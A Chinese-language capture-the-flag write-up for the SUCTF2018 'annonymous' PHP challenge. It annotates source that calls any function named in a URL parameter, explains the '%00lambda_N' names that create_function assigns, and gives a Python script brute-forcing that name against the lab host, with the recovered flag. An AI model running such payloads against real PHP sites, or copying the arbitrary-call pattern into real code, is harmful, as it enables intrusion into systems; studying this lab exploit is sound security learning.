---
title: SUCTF2018-annonymous
date: 2025-04-27 19:37:57
tags:
- creat_function
- 匿名函数
category:
- 刷题笔记
---

# SUCTF2018-annonymous

源码

```
<?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

代码审计

```
<?php  
  
// 使用 create_function 创建一个匿名函数，该函数调用 die() 函数并执行 `cat flag.php` 命令（在服务器上执行，如果PHP环境配置不当的话）。  
// 注意：`cat flag.php` 尝试读取名为 flag.php 的文件内容，这通常用于CTF（Capture The Flag）竞赛中，文件包含“flag”（即比赛的解决标志）。  
// 但直接在PHP中执行系统命令（如 `cat`）是危险的，特别是当命令来源不可控时。  
$MY = create_function("","die(`cat flag.php`);");  
  
// 生成一个随机的32字节字符串，并使用bin2hex函数将其转换为十六进制表示，用作函数名的前缀。  
$hash = bin2hex(openssl_random_pseudo_bytes(32));  
  
// 使用 eval() 函数动态地创建一个新函数，函数名为 "SUCTF_" 加上之前生成的随机哈希值。  
// 这个新函数全局调用之前创建的 $MY 匿名函数，即执行 `die(`cat flag.php`);`。  
// 使用 eval() 是非常危险的，因为它会执行任何传递给它的PHP代码。  
eval("function SUCTF_$hash(){"  
    ."global \$MY;" // 声明使用全局变量 $MY  
    ."\$MY();" // 调用 $MY 匿名函数  
    ."}");  
  
// 检查 $_GET['func_name'] 是否被设置。  
// 如果设置了，则尝试调用对应的函数。这里存在一个严重的安全问题，因为它允许远程用户通过URL参数调用任意函数。  
if(isset($_GET['func_name'])){  
    $_GET["func_name"](); // 直接调用通过URL参数指定的函数  
    die(); // 调用后终止脚本  
}  
  
// 如果没有通过URL传递func_name参数，则显示当前文件的源代码。  
show_source(__FILE__);
```

## 知识点 匿名函数

当在调用执行create_function()创建匿名函数的时候，其实创建的函数是有名字的

格式为：%00lambda_%d，而%d则是一个计数器会递增，用来记录create_function()这个函数执行了多少次

所以我们可以通过调用哪个匿名函数(%d=1)来实现cat flag.php的操作

---

这道题中因为我们不知道前面有多少个匿名函数，所以得通过遍历数字来爆破，执行该函数

直接python脚本

```
import requests
 
for i in range(1,1000):
    r=requests.get(url='http://fe702340-4c4b-4339-8e50-3b6d3db656f9.node5.buuoj.cn:81/?func_name=%00lambda_{}'.format(i))
    if 'flag' in r.text:
        print(r.text)
        print(i)
        break
```

输出结果

```
E:\Python\python.exe E:\Python_study\CTF\BUU\test.py 
<?php
//$flag="flag{1196c299-5928-4db2-bd55-5319ff00be0c}";

15
```

